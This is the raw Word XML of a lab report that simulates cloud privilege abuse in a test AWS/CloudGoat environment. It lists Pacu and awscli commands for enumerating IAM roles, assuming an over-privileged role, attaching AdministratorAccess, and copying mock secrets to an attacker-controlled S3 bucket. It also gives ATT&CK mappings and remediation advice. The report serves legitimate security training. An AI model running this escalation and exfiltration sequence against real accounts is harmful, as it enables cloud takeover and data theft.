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4B2A" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Task 5 — Cloud Privilege Abuse Simulation (Full Report)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10A95351" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Author: MALEPATI SAMSKAR REDDY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AEE01B9" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Date: September 19, 2025</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C4F1FF" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Attacker: Kali Linux — 192.168.17.128</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49848AAB" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Target cloud/test account: simulated AWS environment (S3, IAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC8A373" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3833711B" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Objective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2886FC3D" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Simulate abuse of cloud privileges by identifying overprivileged IAM roles, exploiting role assumption or misconfigurations, and demonstrating escalation to administrative capabilities and access to sensitive resources in a controlled lab. Validate detections and recommend remediations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D878B6C" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Lab Environment &amp; Tools</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33FC9137" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Environment:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B5BC2CB" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Attacker host: Kali Linux — 192.168.17.128</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4CE175" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Target: Simulated AWS test account or CloudGoat deployment (S3 + IAM misconfigurations)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4271F4C9" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Tools:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C88E19" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Pacu (cloud exploitation &amp; escalation modules)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31002F12" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- awscli (for role assumption and object operations)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F1AA525" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- ScoutSuite / Prowler (cloud posture scanning and findings)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C3E73F3" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- CloudTrail and S3 access logs (for detection and validation)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F326B1" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Step-by-Step Methodology (with reconstructed commands)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3520200E" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>The workflow focuses on privilege discovery, escalation, and using assumed credentials to access sensitive resources:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7A8511" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>A. Enumerate IAM roles and instance profiles</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734F97B1" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Example Pacu commands:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F7B5C2F" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t># Start Pacu and enumerate IAM roles/users/policies</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>python3 pacu.py</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t># In pacu console:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>run iam__enum_roles</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>run iam__policy_analysis</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>run iam__enum_instance_profiles</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8C4CB8" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>B. Identify overprivileged roles &amp; attempt role assumption</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0367F9ED" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Example AWS CLI commands and Pacu interactions:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46EBACB9" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t># If a role is vulnerable to assumption or misconfiguration, try assuming it:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>aws sts assume-role --role-arn arn:aws:iam::123456789012:role/OverPrivilegedRole --role-session-name labEscalation --profile compromised</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Use assumed credentials (example environment variables)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>export AWS_ACCESS_KEY_ID=ASIA...</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>export AWS_SECRET_ACCESS_KEY=...</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>export AWS_SESSION_TOKEN=...</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>aws iam list-users</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>aws s3 ls</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A4E14D0" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>C. Escalate privileges and validate administrative access</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00816714" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Example actions:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5C12E0" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t># With assumed role privileges, test listing and altering privileged resources</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>aws iam list-roles</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>aws iam attach-role-policy --role-name TargetRole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Create or retrieve secrets, list S3 buckets and object ACLs</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>aws s3 ls --recursive s3://sensitive-bucket/</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4D0674" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>D. Demonstrate impact by accessing or exfiltrating mock sensitive resources</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47FD3E85" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Example exfiltration (lab-only):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59545EDD" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:br/>
        <w:t># Copy sensitive mock file to a controlled bucket</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>aws s3 cp /tmp/mock_secrets.zip s3://attacker-controlled-bucket/ --profile assumed_role</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Or download locally</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>aws s3 cp s3://sensitive-bucket/mock_secrets.zip ./</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C53DF9A" w14:textId="12472A5D" w:rsidR="00493674" w:rsidRDefault="00000000" w:rsidP="00A94D91">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4. Observed Evidence </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B5D0A4" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 22-22-04.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5211F82C" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 22-26-28.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="166A8C99" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 22-29-29.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10A0908B" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 22-31-22.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD5D87E" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 22-32-34.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78DF5C38" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 22-35-04.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BE1D9B0" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 22-36-56.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12690CD5" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 22-46-14.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631DFD53" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Reconstructed Timeline &amp; Actions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="108C50F7" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t>- T0: Pacu initiated and performed IAM enumeration, discovering potentially overprivileged roles and instance profiles.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- T1: Identified a role that could be assumed or a misconfigured instance profile with attached credentials.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- T2: Assumed role via AWS STS or extracted credentials; exported temporary credentials to environment.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- T3: With elevated privileges, enumerated IAM, listed S3 buckets, and accessed mock sensitive objects.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- T4: Demonstrated exfiltration by copying mock data to an attacker-controlled bucket or downloading locally.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- T5: CloudTrail and S3 logs recorded actions; detection alerts raised in monitoring (if configured).</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="720AD836" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Findings &amp; Risk Assessment</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25159092" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Overprivileged IAM roles or misconfigured instance profiles allow attackers to escalate privileges and access sensitive resources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4757FBBE" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>- Using STS assume-role or compromised credentials, full tenant compromise is possible in a simulated environment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15618589" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Risk Rating: Critical — cloud tenant compromise can result in data exposure, account takeover, and infrastructure manipulation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="594CA69E" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. MITRE ATT&amp;CK Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA0F109" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- T1078.004 — Valid Accounts: Cloud Accounts (use of compromised or valid credentials)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="754BC6D9" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- T1588 — Obtain Capabilities (misuse of cloud features or roles)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77187847" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- T1537 — Transfer Data to Cloud Account (exfiltration to attacker-controlled bucket)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00CB28F8" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- T1538 — Cloud Account Discovery (role, instance profile discovery)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CEF583C" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8. Recommendations (technical &amp; operational)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5518BABB" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Technical controls:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C08179" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Enforce least-privilege for all IAM roles and service accounts; remove AdministratorAccess where not required.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6433BF8B" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Use IAM Access Analyzer and automated policy reviews to detect overly permissive policies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3048275E" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Enable CloudTrail (management and data events) and S3 data event logging; ship to immutable log storage for auditing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1AFBE4" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Use AWS Organizations Service Control Policies (SCPs) to restrict high-risk actions and enforce guardrails.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="353E4341" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Implement IAM role trust boundaries and require MFA for role assumption where practical.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30A6DDE5" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Operational controls:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9B6666" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Periodically rotate keys and remove long-lived credentials; automate detection of unused keys.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40B4001E" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Audit instance profiles for embedded credentials and use instance metadata v2 protections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5475470E" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Run scheduled cloud posture scans (ScoutSuite, Prowler) and remediate findings promptly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3233BADB" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Train cloud engineers about least-privilege and role lifecycle management.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05942413" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9. Forensic Artifacts to Collect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F38AF71" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- CloudTrail logs for the period of testing, including AssumeRole and STS events.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CAF40EA" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- S3 access logs, object-level logs, and server access logs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5A3A0F" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- IAM policy change logs and CloudWatch events related to role modifications.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02721E41" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>- Pacu session logs and any credential artifacts recovered on the attacker host.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EFF5E0E" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Snapshot of instance metadata and any temporary credentials found on instances.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C83300" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10. 50-Word Summary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5977C4" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Using Pacu and awscli, an overprivileged IAM role was identified and assumed, enabling administrative actions and access to sensitive S3 objects. Mock data was exfiltrated to a controlled bucket, demonstrating the impact of role sprawl and misconfiguration. Enforce least-privilege, CloudTrail, and IAM guardrails.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F548235" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>11. Appendix: Reconstructed Commands &amp; Examples</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3813E33A" w14:textId="77777777" w:rsidR="00493674" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t># Pacu (example)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>python3 pacu.py</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># In pacu console:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>run iam__enum_roles</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>run iam__enum_instance_profiles</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>run iam__policy_analysis</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># AWS CLI assume-role (lab only)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>aws sts assume-role --role-arn arn:aws:iam::123456789012:role/OverPrivilegedRole --role-session-name labEscalation --profile compromised</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Export credentials and use to list S3</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>export AWS_ACCESS_KEY_ID=ASIA...</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>export AWS_SECRET_ACCESS_KEY=...</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>export AWS_SESSION_TOKEN=...</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>aws s3 ls</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00493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188031">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="2123646761">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1185554197">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1718623431">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="247544175">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1165321552">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="315106883">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1081832510">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="119684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674"/>
    <w:rsid w:val="008728D2"/>
    <w:rsid w:val="00A94D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FBC61"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{7143E1BA-979A-43D6-A5C7-2A4C3C1E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samskar Malepati</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-09-19T10:32:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>